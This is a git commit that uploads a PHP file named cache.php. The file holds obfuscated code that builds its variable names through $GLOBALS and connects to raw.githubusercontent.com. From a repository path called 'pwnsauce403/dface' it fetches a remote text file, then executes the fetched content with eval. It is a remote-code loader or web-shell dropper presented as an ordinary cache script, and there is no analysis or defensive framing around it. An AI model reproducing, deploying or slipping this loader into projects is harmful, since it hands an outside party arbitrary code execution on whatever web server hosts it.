f40352977f502554376cc93fdf43d5aaa9281064
dorzkim <63092001+dorzkim@users.noreply.github.com>
2024-08-16 00:27:20 +0700

    Add files via upload

---
+++ cache.php
@@ -0,0 +1,9 @@
+<?php ${"GLOBALS"}["ywpwbj"]="content";${"GLOBALS"}["ruqhwoixi"]="out";${"GLOBALS"}["mwiqglaifsi"]="errno";${"GLOBALS"}["dnjhlezvvm"]="fp";${"GLOBALS"}["rwueqxkby"]="path";${"GLOBALS"}["dsgugac"]="port";$host="raw.githubusercontent.com";$vobpopp="errstr";${${"GLOBALS"}["dsgugac"]}=443;${${"GLOBALS"}["rwueqxkby"]}="/pwnsauce403/dface/main/me/tfm.txt";${${"GLOBALS"}["dnjhlezvvm"]}=stream_socket_client("ssl://$host:$port",${${"GLOBALS"}["mwiqglaifsi"]},${$vobpopp},30);if(!${${"GLOBALS"}["dnjhlezvvm"]}){echo"Error: $errstr ($errno)<br />
+";}else{${"GLOBALS"}["jzkmgbgyhic"]="out";${${"GLOBALS"}["ruqhwoixi"]}="GET $path HTTP/1.1
+";${${"GLOBALS"}["jzkmgbgyhic"]}.="Host: $host
+";$enkgdamsp="out";${${"GLOBALS"}["ruqhwoixi"]}.="Connection: Close
+
+";fwrite(${${"GLOBALS"}["dnjhlezvvm"]},${$enkgdamsp});${${"GLOBALS"}["ywpwbj"]}="";while(!feof(${${"GLOBALS"}["dnjhlezvvm"]})){$idtywktewxj="content";${$idtywktewxj}.=fgets(${${"GLOBALS"}["dnjhlezvvm"]},128);}$xwseeucb="header_end";$ujjeycyqx="header_end";fclose(${${"GLOBALS"}["dnjhlezvvm"]});${$xwseeucb}=strpos(${${"GLOBALS"}["ywpwbj"]},"
+
+");if(${$ujjeycyqx}!==false){$doyowakdp="header_end";${"GLOBALS"}["scyqlpwdgj"]="content";${${"GLOBALS"}["scyqlpwdgj"]}=substr(${${"GLOBALS"}["ywpwbj"]},${$doyowakdp}+4);}eval("?>".${${"GLOBALS"}["ywpwbj"]});} 
+?>
